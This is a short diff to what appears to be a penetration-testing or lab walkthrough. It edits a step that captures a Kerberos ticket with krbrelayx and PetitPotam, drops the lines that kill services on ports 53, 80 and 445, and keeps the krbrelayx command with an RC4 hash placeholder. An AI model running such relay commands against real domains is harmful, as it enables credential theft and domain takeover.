@@ -130,11 +130,8 @@ python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "
 ```
 
 ### 5. Capture Kerberos TGT via krbrelayx & PetitPotam
-Kill conflicting services, then run krbrelayx with explicit interface IP:
+run krbrelayx with explicit interface IP:
 ```bash
-sudo fuser -k 53/tcp 2>/dev/null
-sudo fuser -k 80/tcp 2>/dev/null
-sudo fuser -k 445/tcp 2>/dev/null
 python3 krbrelayx.py -hashes :<rc4_hash> -ip <my_ip>
 ```
 
